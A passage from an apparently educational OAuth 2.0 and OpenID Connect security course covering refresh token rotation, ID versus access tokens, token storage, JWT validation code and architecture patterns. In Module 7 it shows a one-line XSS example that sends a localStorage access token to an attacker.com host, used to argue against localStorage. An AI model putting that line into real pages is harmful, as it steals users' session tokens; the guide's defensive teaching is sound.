    return fetch(endpoint, { headers: { Authorization: `Bearer ${token}` } });
  }

  return res.json();
}

async function silentRefresh() {
  const res = await fetch('https://auth.example.com/token', {
    method: 'POST',
    body: new URLSearchParams({
      grant_type: 'refresh_token',
      refresh_token: getStoredRefreshToken(),
      client_id: CLIENT_ID
    })
  });

  if (!res.ok) return null; // expired or revoked — force re-login

  const data = await res.json();
  storeToken(data.access_token, data.expires_in);

  // CRITICAL: store the NEW refresh token — old one is now dead
  if (data.refresh_token) storeRefreshToken(data.refresh_token);

  return data.access_token;
}
```

> **🔐 Refresh token rotation:** Every use of a refresh token issues a NEW one and invalidates the old. If an attacker steals an old refresh token and tries to use it, the next legitimate use fails — alerting the system. This is not optional — enable it on every Auth Server configuration.

### ⚠️ Deprecated flows — what you will find in old codebases

```
IMPLICIT GRANT (removed in OAuth 2.1):
  Was:     access_token returned in URL fragment: /callback#access_token=xyz
  Problem: Token in URL = token in browser history, Referrer headers, server logs
  When you see it: SPAs built 2012–2018 using libraries like angular-oauth2-oidc
  Replace with: Authorization Code + PKCE (works fine in browsers with CORS support)

RESOURCE OWNER PASSWORD (ROPC) (removed in OAuth 2.1):
  Was:     App collects username + password, sends them to token endpoint
  Problem: Re-introduces the exact problem OAuth was designed to eliminate.
           The app sees your password. The user cannot trust the consent UI.
  When you see it: Legacy mobile apps, old "trusted first-party" integrations
  Replace with: Authorization Code + PKCE
```

> 💬 *"If you inherit a codebase using Implicit or ROPC — congratulations, you now have a security project. Budget time to replace them. Both are gone from OAuth 2.1 for good reason."*

---

## Module 6 — OpenID Connect (OIDC) {#module-6}

### 🎯 The one question that unlocks this module

> **"OAuth tells me what an app can DO. But who IS the user?"**
> OAuth 2.0 alone cannot tell you reliably. OIDC adds exactly that — a standardised, cryptographically verified identity layer on top of OAuth.

### 💡 Plain English

> OIDC in one sentence: It is OAuth 2.0 with one extra thing — the Auth Server also tells your app who the user is, via a special signed token called the ID token.

### 💡 The office building analogy

```
OAUTH ALONE:
  A visitor gets a keycard that opens specific doors.
  The door reader says "valid card — enter."
  The door reader does NOT know who the person is. Just that the card works.

OAUTH + OIDC:
  Same keycard (access_token) → opens the same doors.
  PLUS a name badge with photo and employee number (id_token) → tells RECEPTION who they are.

  Reception (your app) = reads the name badge to know WHO arrived.
  Door readers (APIs)  = check the keycard to know WHAT is allowed.

CRITICAL RULE:
  Never show the name badge (id_token) to a door reader (API).
  The door reader expects a keycard format. It will reject the badge.
  The badge's audience is RECEPTION only (your client_id) — not the doors.
```

### 💡 Three tokens — exactly what to do with each

```
┌────────────────────────────────────────────────────────────────────┐
│  You just received three tokens. Here is EXACTLY what to do.      │
├────────────────────────────────────────────────────────────────────┤
│                                                                    │
│  ACCESS TOKEN                                                      │
│  → Store in:  JavaScript memory (a plain variable)                │
│  → Send to:   Every API request: Authorization: Bearer <token>    │
│  → NEVER:     localStorage, URLs, logs, cookies accessible to JS  │
│  → Expiring:  Use refresh_token to get a new one silently         │
│                                                                    │
│  ID TOKEN                                                          │
│  → Use to:    Read who the user is (sub, email, name, roles)      │
│  → Store:     Save iss+"|"+sub as your user's DB primary key      │
│  → NEVER:     Send to an API — it will reject it (wrong aud)      │
│  → After:     You are done with it — don't store it long-term     │
│                                                                    │
│  REFRESH TOKEN                                                     │
│  → Store in:  httpOnly cookie (browser) or encrypted DB (server)  │
│  → Send to:   ONLY the Auth Server's /token endpoint              │
│  → NEVER:     Expose to JavaScript, send to an API, log it        │
│  → Guard it:  If stolen, attacker generates access tokens freely  │
│                                                                    │
└────────────────────────────────────────────────────────────────────┘
```

### 💡 ID token — the fields that matter

```json
{
  "iss": "https://auth.example.com",
  "sub": "user_123",           // ← USE THIS as your database key. Always.
  "aud": "my-client-app",      // ← YOUR client_id — NOT the API's URL
  "exp": 1713456789,
  "iat": 1713453189,
  "nonce": "n-0S6_WzA2Mj",    // ← MUST match what you sent (replay prevention)
  "email": "jane@example.com",
  "email_verified": true,      // ← MUST be true before trusting the email
  "name": "Jane Smith",
  "given_name": "Jane"
}
```

> **🔐 Never use email as your user's unique identifier.** Email addresses change. Two different IdPs can issue the same email for different people. The stable identifier is `iss + "|" + sub`. Store this as the primary key in your users table. Always.

> **🔐 Always check `email_verified: true`.** A user can register `cto@yourcompany.com` with Google without owning that domain. If you skip the `email_verified` check, an attacker signs up with your CTO's email at a consumer IdP and your app treats them as the CTO.

### 💡 OIDC scopes — what each one unlocks

```
scope=openid               → REQUIRED for OIDC. You get: sub only.
scope=openid profile       → Also get: name, given_name, family_name, picture, locale
scope=openid email         → Also get: email, email_verified
scope=openid address       → Also get: address { street, city, country }
scope=openid phone         → Also get: phone_number, phone_number_verified
```

### 💡 Discovery — auto-configuration from one URL

```javascript
// Every OIDC provider publishes a single JSON document.
// Fetch it ONCE at startup — never hardcode endpoint URLs.
const discovery = await fetch(
  'https://auth.example.com/.well-known/openid-configuration'
).then(r => r.json());

// Now you have everything automatically:
discovery.authorization_endpoint  // where to send login requests
discovery.token_endpoint           // where to exchange codes for tokens
discovery.userinfo_endpoint        // where to get fresh user profile
discovery.jwks_uri                 // where to get public keys for JWT validation
discovery.revocation_endpoint      // where to revoke tokens on logout
discovery.introspection_endpoint   // where to validate opaque tokens

// This is why you only need to know ONE URL per IdP — everything else is auto-discovered.
```

### 💡 The Hybrid flow — when you encounter response_type=code id_token

```
Standard:  response_type=code          → Authorization Code (always use this for new builds)
Hybrid:    response_type=code id_token → Gets id_token immediately in the front channel
                                          AND an auth code for back-channel token exchange

Why it exists:
  Older enterprise RPs (Relying Parties) needed the id_token BEFORE the
  back-channel exchange to display the user's name on the consent screen.

When you will encounter it:
  Legacy enterprise OIDC integrations (pre-2018 builds)
  Some Microsoft Azure AD configurations
  Some government / NHS identity federation setups

Security consideration:
  id_token in the front channel = id_token in the URL = in browser history.
  The c_hash claim in the id_token cryptographically binds it to the auth code.
  Always validate c_hash if you use Hybrid flow.

For new builds: ALWAYS use plain response_type=code. Never Hybrid.
```

### 📖 Real-world: "Sign in with Google" — completely dissected

```
What you see:  A button. You click it. Google login appears. You approve.
               You are back in the app, logged in, name and photo shown.

What actually happened — all 9 steps:

Step 1:  Your app generates PKCE pair + state + nonce.
         Stores verifier, state, nonce in sessionStorage.

Step 2:  Redirect to Google:
         https://accounts.google.com/o/oauth2/v2/auth
           ?response_type=code
           &client_id=YOUR_ID.apps.googleusercontent.com
           &redirect_uri=https://yourapp.com/callback
           &scope=openid+email+profile
           &state=RANDOM_STATE
           &nonce=RANDOM_NONCE
           &code_challenge=S256_HASH
           &code_challenge_method=S256

Step 3:  Google shows: "This app wants to see your name and email. Allow?"
Step 4:  You click Allow.
Step 5:  Google redirects to /callback?code=4/0AX4XfWi...&state=...
Step 6:  App verifies state matches stored value. (CSRF check. Critical.)
Step 7:  App server calls /token (back-channel):
           code + code_verifier + client_secret → access_token + id_token + refresh_token
Step 8:  Validate id_token:
           iss=accounts.google.com ✓
           aud=YOUR_CLIENT_ID ✓
           nonce matches sessionStorage value ✓
           exp is in the future ✓
           email_verified=true ✓
Step 9:  Extract user identity:
           const userId = `${idToken.iss}|${idToken.sub}`;
           // Store this in your users table. Not the email.
           // Sub value: "110248495921238986420" — stable forever.
```

### 🧩 Connect the dots

> 🧩 **OIDC nonce and OAuth state:** They both do the same job in different directions. `state` binds the callback to your specific authorization request (prevents CSRF on the redirect). `nonce` binds the ID token to your specific authorization request (prevents replay of a stolen ID token). Always use both when using OIDC.

### 🎓 Interview-ready — Module 6

```
❓ "What is the difference between the access_token and id_token in OIDC?"
⭐ Answer that impresses:
   "They serve completely different purposes. The access_token is a credential
   for calling APIs — it proves the app has permission to do something. It goes
   in the Authorization header on every API request. The id_token is a statement
   of identity — it proves who the user is. It is for the application to read,
   not for APIs. The audience claim tells you this: the access_token's aud is
   the API's URL; the id_token's aud is your client_id. Sending an id_token to
   an API is a common mistake that will result in a 401 because the aud is wrong."
```

### ⚡ Speed run — Module 6

```
⚡ OIDC = OAuth + identity. It adds the id_token, UserInfo endpoint, and discovery.
⚡ id_token = who the user is. For your app only. NEVER send to an API.
⚡ access_token = what the app can do. Send to every API call. Nothing else.
⚡ Store iss+sub as user identifier — never email (it changes)
⚡ Always check email_verified=true before trusting the email claim
```

---

## Module 7 — Production security {#module-7}

### 🎯 The one question that unlocks this module

> **"My app calls logout(). The user is still logged in. What happened?"**
> JWTs are stateless. Calling "logout" clears your local session — but the token is still valid until exp. This is the JWT logout problem. The solution is here.

### 💡 Token storage — the decision with the most consequences

```
Storage option         XSS risk   CSRF risk   Survives refresh   Verdict
────────────────────────────────────────────────────────────────────────────
JS memory (variable)   Low        None        ❌ No              ✅ access_token
localStorage           🔴 HIGH     None        ✅ Yes             ❌ NEVER
sessionStorage         🔴 HIGH     None        ❌ No              ⚠️ PKCE state only
httpOnly cookie        None       Medium      ✅ Yes             ✅ refresh_token
Server-side (BFF)      None       None        ✅ Yes             ✅ Best for SPAs
```

```javascript
// WHY localStorage is dangerous — one line of malicious JavaScript:
fetch('https://attacker.com/steal?t=' + localStorage.getItem('access_token'));
// Any XSS payload anywhere on your page can do this.
// The token is now in the attacker's hands.

// WHY httpOnly cookies are safer:
console.log(document.cookie);
// httpOnly cookies do NOT appear here.
// JavaScript cannot read them.
// XSS attacks cannot steal what JavaScript cannot see.
```

### 💡 The BFF pattern — the right architecture for browser apps

```
THE PROBLEM WITH SPAS HOLDING TOKENS:
  React app → gets tokens from Auth Server → stores in memory or cookies
  → Any XSS attack can steal tokens (if memory is accessible)
  → CSRF attacks possible if using cookies without careful configuration

THE BFF SOLUTION (Backend for Frontend):
  Browser never has tokens. Tokens live only on the BFF server.
  Browser communicates with BFF via httpOnly session cookie.
  BFF attaches Bearer tokens to API calls transparently.

  [Browser / React] ──── httpOnly session cookie ────► [BFF Node/Express]
                                                              │
                                              ┌───────────────┼────────────────┐
                                              ▼               ▼                ▼
                                        [Auth Server]   [Resource Server] stores
                                        (OIDC flow)     Bearer token here, not
                                                        in the browser

  JavaScript in the browser: cannot access the access_token.
  XSS attack in the browser: finds no tokens to steal.
```

### 💡 Complete API validation — the production code

```javascript
import { createRemoteJWKSet, jwtVerify } from 'jose';

// Setup ONCE at startup — not per request
const JWKS = createRemoteJWKSet(
  new URL('https://auth.example.com/.well-known/jwks.json'),
  { cacheMaxAge: 600_000 }  // Cache public keys for 10 minutes
);

export async function requireAuth(req, res, next) {
  const header = req.headers.authorization;

  if (!header?.startsWith('Bearer ')) {
    return res.status(401).json({
      error: 'missing_token',
      error_description: 'Authorization: Bearer <token> header required'
    });
  }

  try {
    const { payload } = await jwtVerify(header.slice(7), JWKS, {
      issuer:     process.env.AUTH_ISSUER,   // validates iss claim
      audience:   process.env.API_AUDIENCE,  // validates aud claim
      algorithms: ['RS256', 'ES256'],         // BLOCKS alg:none attack
      // exp is always validated automatically by the library
    });

    // Manual scope check (library doesn't do this automatically)
    const requiredScope = 'api.read';
    if (!payload.scope?.split(' ').includes(requiredScope)) {
      return res.status(403).json({
        error: 'insufficient_scope',
        error_description: `Scope '${requiredScope}' is required`
      });
    }

    // Attach verified claims to the request for downstream use
    req.user = payload;  // { sub, email, roles, scope, ... }
    next();

  } catch (err) {
    return res.status(401).json({
      error: 'invalid_token',
      error_description: err.message
    });
  }
}
```

### 🔐 The security rules — every one is non-negotiable

```
1.  PKCE for all Authorization Code flows — no exceptions
2.  Validate state on every callback — prevents CSRF
3.  Never store tokens in localStorage
4.  Never put tokens in URL query strings
5.  Never send the id_token to an API — it will reject it
6.  Never use email as user identifier — use iss+sub composite key
7.  Set explicit algorithm allowlist — never allow alg:none
8.  Always validate iss AND aud — both, every time
9.  Enable refresh token rotation — on every Auth Server config
10. Secrets in secrets manager (Vault/AWS SM) — never in source code
11. Check email_verified=true before trusting the email claim
12. Revoke refresh token on logout via RFC 7009 revocation endpoint
```

### 💥 Production incident — the 3am certificate alert

```
📟 03:17 AM — PagerDuty fires. "401 error rate 94%. All services affected."

You open your laptop. Error across every service: "Signature verification failed."
First thought: deployment. Nobody deployed anything.
Second thought: configuration change. Nothing changed.
Third thought: certificate.

You check the Auth Server's signing certificate:
  Valid from: 2022-01-15
  Valid until: 2024-04-18 03:00:00  ← that was 17 minutes ago

The Auth Server's signing certificate expired at 3am.
Every JWT issued since then has a signature that cannot be verified
against the now-expired certificate.
Every API is rejecting every request.
Engineers across 12 time zones cannot log in to anything.

Root cause:    No certificate expiry monitoring.
Immediate fix: Emergency certificate rotation — 45 minutes if you know the
               Module 3 zero-downtime procedure. 3 hours if you don't.
Long-term fix: Alert at 30 days, 14 days, 7 days, 3 days, 1 day before expiry.
               Automate rotation. Never let a human forget.

This is why expiry monitoring is in the production checklist.
Now you know why it matters at 3am.
```

### 🏭 The Hall of Shame — real breaches from getting this wrong

```
CVE-2015-9235 — alg:none attack (multiple libraries):
  Auth0's node-jsonwebtoken and dozens of other libraries accepted
  "alg":"none" by default. An attacker could take any valid JWT,
  strip the signature, set alg=none, and the library accepted it.
  This meant anyone could authenticate as any user with no credentials.
  Fix: always set an explicit algorithm allowlist. Trust nothing by default.

CVE-2022-21449 — "Psychic Signatures" (Java 15-17):
  A bug in Java's ECDSA signature verification accepted certain invalid
  signatures, including all-zeros signatures, as valid for any message.
  An attacker could forge JWT signatures for any payload with Java applications.
  Fix: keep runtime and library dependencies updated. Pin and monitor.

Tokens in URLs (Facebook, 2012):
  Access tokens were placed in URL fragments for the Implicit flow.
  Referrer headers leaked these tokens to analytics scripts on third-party pages.
  Millions of active access tokens were exposed to advertising networks.
  Fix: never put tokens in URLs. The auth code exists for this exact reason.
```

### 🤔 What would you do?

```
Scenario: A user reports they logged out of your app but can still
make API calls for 30 more minutes. Your logout handler clears the
session cookie and calls the Auth Server's logout endpoint.
But the access_token is still valid.

What would you do?

Option A: Shorten access token expiry to 5 minutes.
  Trade-off: More token refresh calls. Slightly worse UX on slow connections.
  Good for: Any app where quick revocation matters.

Option B: Implement a token blocklist in Redis.
  On logout: store the token's JTI claim with TTL = remaining validity.
  On every API request: check if JTI is in the blocklist before serving.
  Trade-off: Every request hits Redis. Redis becomes a dependency.
  Good for: Financial apps, healthcare, anything requiring instant revocation.

Option C: Use opaque tokens with introspection instead of JWTs.
  The Auth Server can revoke opaque tokens instantly.
  Trade-off: Every API request calls /introspect (+50-100ms latency).
  Good for: Systems that already need strict revocation for compliance reasons.

Option D: Accept the logout gap for low-risk apps.
  Communicate to users: "Logout takes effect within X minutes."
  Trade-off: Some users find this unacceptable.
  Good for: Low-risk consumer apps where immediate revocation is not a requirement.

Real answer: Most production apps use A + B. Short expiry reduces the window.
Blocklist catches the rest for security-sensitive operations.
```

### 💡 OAuth 2.1 — what is changing

```
REMOVED:   Implicit grant     → Replace with Authorization Code + PKCE
REMOVED:   ROPC grant         → Replace with Authorization Code + PKCE
MANDATORY: PKCE for ALL Authorization Code flows (public AND confidential clients)
MANDATORY: Refresh token rotation
MANDATORY: Exact redirect URI string matching (no wildcards or partial matches)
BANNED:    Bearer tokens in URL query strings (logs, history exposure)

If your system passes an audit against OAuth 2.1 requirements,
it is also protected against every known OAuth attack class.
Aim for 2.1 compliance even before it becomes a formal standard.
```

### ⚡ Speed run — Module 7

```
⚡ Access tokens in memory (variable). Refresh tokens in httpOnly cookie.
⚡ Never localStorage — one XSS attack away from full token theft
⚡ BFF pattern: tokens server-side, browser gets only a session cookie
⚡ Revoke refresh token on logout (RFC 7009) — access token expires naturally
⚡ Monitor Auth Server certificate expiry — set alerts at 30, 14, 7, 1 days
```

---

## Module 8 — Architecture patterns {#module-8}

### 💡 Delegated authorisation — the precise mental model

```
WHAT IS DELEGATED:
  You (Resource Owner) permanently own your data.
  You DELEGATE a specific, limited permission to an application (Client).
  The app acts ON YOUR BEHALF — only within what you permitted.

THE TOKEN CARRIES THE ANSWER TO THREE QUESTIONS:
  WHO is acting?      → client_id claim
  ON BEHALF OF WHOM?  → sub claim
  WHAT is permitted?  → scope claim

  "client_id=fitness-app acted for sub=user_123 with scope=calendar.readonly"

DELEGATION vs IMPERSONATION (a critical distinction):
  Delegation:     App acts on behalf of user. API knows it is an app.
  Impersonation:  App pretends TO BE the user. API thinks it is talking to the user.

  OAuth is delegation. Impersonation is an anti-pattern.
  The API always knows it is serving an app acting for a user — never "the user."
```

### 💡 Token Relay — user context through a microservice chain

```
THE PROBLEM:
  Browser → Gateway → Service A → Service B

  Service A has a user token (aud=service-a).
  It cannot forward this token to Service B (aud mismatch → 401 Unauthorized).
  But Service B needs to know WHICH USER triggered the request for audit purposes.

THE WRONG SOLUTION (DO NOT DO THIS):
  Service A forwards the user's token to Service B.
  Service B's validation: aud="service-a" ≠ "service-b" → 401.
  Even if Service B ignored the aud check — this is a security hole.
  Any service could act with any other service's token.

THE RIGHT SOLUTION (RFC 8693 Token Exchange):
  Service A calls Auth Server:
    POST /token
    grant_type=urn:ietf:params:oauth:grant-type:token-exchange
    subject_token=<user's original token>
    audience=https://service-b.example.com

  Auth Server issues a NEW token:
  {
    "sub": "user_123",                    ← original user preserved
    "aud": "https://service-b.example.com", ← now scoped to Service B
    "act": { "sub": "service-a" }         ← Service A is the actor
  }

  Full audit trail:
    Who triggered it: user_123
    Who called Service B: service-a (acting on behalf of user_123)
    What they were allowed: scope of the new token

When to use Token Relay:
  ✅ Downstream service needs to know which USER triggered the call
  ✅ Audit logs must trace the original user through the chain
  ✅ Data access must be scoped to the user's own entitlements

When to use Client Credentials instead:
  ✅ Background job — no user context exists
  ✅ Service acting on its own behalf (not a user's behalf)
```

### 💡 Choose your adventure — grant type selection

```
START: What are you building?
│
├── Something a HUMAN USER will interact with?
│   │
│   ├── Runs IN A BROWSER (React, Vue, plain HTML)?
│   │   └── Authorization Code + PKCE  [Module 4]
│   │
│   ├── MOBILE or DESKTOP native app?
│   │   └── Authorization Code + PKCE (PKCE is mandatory — no client_secret)  [Module 4]
│   │
│   ├── SMART TV, CLI, or INPUT-CONSTRAINED device?
│   │   └── Device Code grant  [Module 5]
│   │
│   └── Building a first-party login UI (you control both app and auth)?
│       └── Authorization Code + PKCE (NEVER ROPC — deprecated and insecure)  [Module 4]
│
└── NO human user — pure machine / service?
    │
    ├── Does the downstream service need to know WHICH USER triggered this?
    │   └── Token Exchange / Token Relay  [Module 8]
    │
    ├── Background job or system process?
    │   └── Client Credentials  [Module 3]
    │
    └── Scheduled report / ETL / nightly sync?
        └── Client Credentials  [Module 3]
```

### 💡 The N-tier identity architecture — how everything fits together

```
┌───────────────────────────────────────────────────────────────────────┐
│  GOVERNANCE: IGA (SailPoint/Saviynt) — who should have access        │
│  Access reviews, SoD enforcement, compliance reporting                │
└───────────────────────────┬───────────────────────────────────────────┘
                            │ triggers provisioning
                            ▼
┌───────────────────────────────────────────────────────────────────────┐
│  IDENTITY: Active Directory / Azure AD — who users ARE               │
│  Source of truth for employees. Groups → entitlements.               │
└───────────────────────────┬───────────────────────────────────────────┘
                            │ LDAP (read) + SCIM (write to apps)
                            ▼
┌───────────────────────────────────────────────────────────────────────┐
│  FEDERATION: PingFederate / Okta — the auth broker                   │
│  Authenticates users. Issues tokens.                                  │
│  SAML → legacy SaaS │ OIDC → modern apps │ OAuth → APIs             │
└───────────────────────────┬───────────────────────────────────────────┘
                            │
          ┌─────────────────┼──────────────────────────┐
          ▼                 ▼                           ▼
   [Salesforce]       [Modern Web App]           [REST API]
   SAML SSO           OIDC + OAuth               OAuth 2.0
   (separate guide)   BFF pattern                JWT validation
```

---

## Quick reference {#quick-reference}

### JWT validation checklist

```
✅ Signature — RS256/ES256 with public key from JWKS endpoint
✅ alg — explicit allowlist only (never permit none, HS256 for APIs)
✅ exp — reject if current time is past this
✅ iss — must match expected Auth Server URL exactly
✅ aud — must match THIS API's own identifier
✅ scope — contains the permission required for this endpoint
```

### Security rules — all 12, no exceptions

```
 1. PKCE for all Authorization Code flows
 2. Validate state on every callback (CSRF prevention)
 3. Never store tokens in localStorage
 4. Never put tokens in URL query strings
 5. Never send the id_token to an API
 6. User identifier = iss+sub composite, never email alone
 7. Explicit algorithm allowlist — block alg:none
 8. Validate both iss AND aud on every request
 9. Enable refresh token rotation
10. Secrets in secrets manager, never in source code
11. Check email_verified=true before trusting email
12. Revoke refresh token on logout (RFC 7009)
```

### Choose your grant type

```
Human in a browser → Auth Code + PKCE
Human on a device (TV/CLI) → Device Code
No human, machine only → Client Credentials
Need user context across services → Token Exchange (RFC 8693)
```

---

## Glossary {#glossary}

| Term | Plain English |
|---|---|
| **Auth Server (AS)** | The service that issues tokens (Okta, PingFed, Auth0, Google) |
| **Resource Server (RS)** | Your API — validates tokens, serves protected data |
| **Relying Party (RP)** | Another name for Client in OIDC — the app relying on the IdP |
| **JWT** | A signed, self-contained token readable by anyone but tamper-proof |
| **JWK** | A public key in JSON format |
| **JWKS** | A URL serving a set of JWKs (public keys) |
| **JTI** | A unique ID for one specific JWT — used to prevent replay attacks |
| **PKCE** | Per-request cryptographic proof replacing client_secret for public clients |
| **BFF** | Backend for Frontend — a server-side proxy that holds tokens for browser apps |
| **ROPC** | Resource Owner Password Credentials — deprecated, never use for new builds |
| **SPA** | Single Page Application — a browser app with no server rendering (React, Vue) |
| **OIDC** | OpenID Connect — identity layer on top of OAuth 2.0 |
| **scope** | A string describing a specific permission (e.g. "calendar.readonly") |
| **sub** | Subject — the unique ID of the user or service this token is about |
| **iss** | Issuer — the URL of the Auth Server that created the token |
| **aud** | Audience — who this token is intended for (the API's base URL) |
| **exp** | Expiry — Unix timestamp after which the token must be rejected |
| **iat** | Issued At — Unix timestamp when the token was created |
| **jti** | JWT ID — unique identifier for this specific token |
| **RS256** | RSA Signature SHA-256 — asymmetric signing, standard for JWTs |
| **ES256** | ECDSA Signature SHA-256 — faster alternative with smaller keys |
| **HS256** | HMAC SHA-256 — symmetric, shared secret — avoid for APIs |
| **2-legged** | OAuth with no user — Client + Auth Server only |
| **3-legged** | OAuth with a user — Client + Auth Server + Resource Owner |
| **alg:none** | JWT attack where signature is removed and library skips verification |
| **PAR** | Pushed Authorization Requests — auth request sent server-side before browser redirect |
| **DPoP** | Demonstration of Proof-of-Possession — binds token to specific client key |
| **Token Exchange** | RFC 8693 — exchanging one token for another with different scope/audience |

---

*OAuth 2.0: RFC 6749 · PKCE: RFC 7636 · Device Code: RFC 8628 · JWT: RFC 7519 · JWKS: RFC 7517 · Introspection: RFC 7662 · Revocation: RFC 7009 · Token Exchange: RFC 8693 · OIDC Core 1.0 · OAuth 2.1: draft-ietf-oauth-v2-1*


### 🤔 What would you do? — JWT edition

```
Scenario: Your team is debating between JWT tokens and opaque tokens
for your new payments API. The CTO wants "instant revocation for
compliance." Your architect wants "no extra latency per request."
You have been asked to recommend an approach.

Think it through... then read:

The CTO is right about the compliance requirement.
The architect is right about the performance concern.
Both requirements are valid. The answer is: both, contextually.

Recommended approach:
  Standard API calls:     JWT tokens (local validation, 0ms overhead)
  High-value operations:  Opaque tokens + introspection (instant revocation)
  (or JWT + short expiry + Redis blocklist for the sensitive endpoints)

Implementation:
  Issue JWTs for general use (profile reads, list endpoints).
  Issue short-lived (5 min) JWTs for sensitive operations.
  Add a Redis blocklist check specifically for payment endpoints.
  This gives you: fast for 95% of calls, revocable for the 5% that matter.

This is a real architectural pattern used in financial services.
The cost of introspection on every payment call is acceptable.
The cost of introspection on every page load is not.
```

### 🧩 Connect the dots — Module 2

> 🧩 **JWT and the stateless architecture:** In Module 1 you learned that OAuth is about delegated authorisation. JWTs make that delegation *portable* — the delegation decision (what the app is allowed to do) is encoded in the token and travels with every request. Any server, anywhere in your infrastructure, can verify the delegation independently. This is why microservices love JWTs: no shared session store, no central auth server call, no bottleneck. The trust travels with the request.

---

### 🧩 Connect the dots — Module 3

> 🧩 **Client Credentials and the 2-legged mental model:** In the VIP event analogy, Client Credentials is your assistant going directly to the box office to get a wristband for the service entrance — you are not there at all. The wristband (access token) says `sub=your-assistant` (the service's client_id), not `sub=you` (a user). When the Resource Server sees this token, it knows: no human is behind this request — it is a service acting as itself. This is why the `sub` claim in Client Credentials tokens is always the `client_id`, not a user ID.

### 🎓 Interview-ready — Module 3

```
❓ "Why doesn't Client Credentials issue a refresh token?"
⭐ Answer that impresses:
   "Because there is no user session to maintain. A refresh token exists to
   allow an app to silently renew access without disturbing the user.
   With Client Credentials, the app is the user — it can simply request a
   new access token at any time by submitting its client_id and client_secret
   again. There is no user who would be interrupted. The app caches the token
   and requests a fresh one when it is about to expire — that IS the renewal
   mechanism. A refresh token would add complexity with no benefit."

❓ "How do you store a client_secret securely in a production service?"
⭐ Answer that impresses:
   "Never in source code — even in a private repo. Never in environment
   variables baked into a container image. The correct approach is:
   inject at runtime from a secrets manager. In AWS: Secrets Manager or
   Parameter Store, retrieved via IAM role at startup. In Kubernetes:
   sealed secrets or Vault Agent injector. The secret should be rotatable
   without a code deployment — store the reference to the secret, not the
   secret itself, in your application configuration."
```

---

### 🧩 Connect the dots — Module 5

> 🧩 **Refresh tokens and the 3-legged architecture:** Refresh tokens only exist in 3-legged flows (Authorization Code, Device Code) — never in 2-legged (Client Credentials). This is deliberate: refresh tokens exist because there is a human user whose session must be maintained without interrupting them. When the access token expires, the refresh token lets the app silently get a new one — the user never re-types their password. In 2-legged flows there is no user to interrupt, so there is no need for a refresh token. The service simply requests a new access token with its credentials.

### 🤔 What would you do? — Device Code edition

```
Scenario: You are building a CLI tool that lets developers deploy
infrastructure. The CLI needs to call your deployment API on behalf
of the logged-in developer. The developer runs: deploy --env production

You have two choices:
  A) Prompt for username + password in the terminal (ROPC)
  B) Device Code flow — show a URL and code, user approves in browser

What is wrong with Option A?
  ROPC is removed from OAuth 2.1. The CLI stores or transmits the developer's
  password. It cannot support MFA (no browser for the MFA prompt).
  It cannot support SSO (no redirect to the corporate IdP).
  Modern enterprise deployments REQUIRE MFA and SSO — Option A blocks both.

Why Option B is correct:
  Developer runs deploy → terminal shows:
    "Open https://auth.example.com/device in your browser"
    "Enter code: BDPF-YTVQ"
  Developer opens their normal browser → already logged into company SSO
  → one click to approve → terminal gets token → deployment proceeds

  This is exactly how AWS CLI --sso, GitHub CLI, and Azure CLI work.
  The browser handles SSO and MFA. The terminal gets a token. Everyone wins.

The right answer: Device Code. Always. For any CLI or non-browser tool.
```

### 🎓 Interview-ready — Module 5

```
❓ "A user using your CLI tool goes through Device Code auth.
    After approval, the CLI exits. Tomorrow they run it again.
    Should they have to authenticate again?"
⭐ Answer that impresses:
   "No — if refresh token rotation is implemented correctly. The CLI should
   store the refresh token securely (OS keychain on macOS, Windows Credential
   Manager, or libsecret on Linux). On subsequent runs, attempt a silent
   refresh first: exchange the stored refresh_token for a new access_token.
   If the refresh token is expired or revoked, fall back to Device Code flow.
   This gives a seamless 'already authenticated' experience for daily use
   while still requiring explicit re-auth after long inactivity or token
   revocation. GitHub CLI does exactly this — you authenticate once and
   stay authenticated across sessions."

❓ "What is the difference between the device_code and user_code?"
⭐ Answer that impresses:
   "The device_code is a long, opaque credential the device sends back
   to the Auth Server when polling for a token — it is machine-readable
   and should never be shown to users. The user_code is a short, human-
   friendly code (like BDPF-YTVQ) that the user types into the browser
   at the verification URI. They serve different purposes: device_code
   identifies the pending authorisation on the server; user_code lets
   the user prove they are physically present with the device."
```

### ⚡ Speed run — Module 5

```
⚡ Device Code: device shows a short code + URL, user approves on phone/browser
⚡ Refresh tokens: silent renewal — user never re-types password between sessions
⚡ Refresh token rotation: every use issues a NEW token, old one dies — enables theft detection
⚡ Implicit grant: REMOVED in OAuth 2.1 — tokens in URLs = tokens in logs
⚡ ROPC: REMOVED in OAuth 2.1 — app collecting passwords defeats all of OAuth's purpose
```

---

### 🤔 What would you do? — OIDC identity edition

```
Scenario: Your app uses "Sign in with Google." A user logs in.
Their id_token contains: email=jane@company.com, email_verified=true
You store email as the primary key in your users table.

Six months later, Jane changes her Google account email to jane.smith@company.com.
She tries to log in. Your app creates a DUPLICATE account for jane.smith@company.com.
All of Jane's history, preferences, and data are in the old account.
She files a support ticket: "I lost all my data."

How would you have prevented this?

The problem:
  You used email as the identifier. Email is mutable.
  When it changed, your app saw a completely new identity.

The fix:
  Store the sub claim (or iss+sub composite) as the primary key.
  sub is assigned by Google when the account is created.
  It never changes — not when the email changes, not ever.

  In your database:
    Wrong:  users.email = "jane@company.com" (primary key)
    Right:  users.google_sub = "110248495921238986420" (primary key)
    Right:  users.auth_key = "accounts.google.com|110248495921238986420"

Also allow the user to have multiple emails linked to one account.
Email is a display name. sub is the identity.

Real consequence: Airbnb, Medium, and dozens of major apps have had
"login with social loses all data" bugs caused by using email as an
identifier. The sub claim exists precisely to prevent this.
```

### 💬 Mentor aside — OIDC

> 💬 *"The id_token vs access_token confusion causes more production bugs than almost any other OIDC mistake. Here is a quick test you can run: decode both tokens at jwt.io and compare the `aud` claim. The access_token's aud should be your API's URL. The id_token's aud should be your client_id. If you ever see your client_id in the aud of a token you are sending to an API — stop. You are sending the wrong token."*

---

### 🧩 Connect the dots — Module 7

> 🧩 **Token storage and the front/back-channel split:** In Module 4 you learned that sensitive tokens must never travel through the front channel (URLs, browser redirects). Token *storage* follows the same principle. localStorage is the front channel of storage — accessible to any JavaScript on your page, including third-party scripts. The httpOnly cookie is the back channel of storage — invisible to JavaScript, only read by the browser's HTTP layer. The BFF pattern extends this further: tokens live entirely on the server, and the browser only has a session cookie reference. Front channel for the useless stuff. Back channel for everything that matters.

### 🎓 Interview-ready — Module 7

```
❓ "A user logs out of your app. 20 minutes later, their access token
    is used to call your API. The call succeeds. How did this happen
    and how would you prevent it?"
⭐ Answer that impresses:
   "JWTs are stateless — calling logout() clears the local session but
   the token remains cryptographically valid until its exp claim passes.
   If the token had 20 minutes remaining when logout was called, those
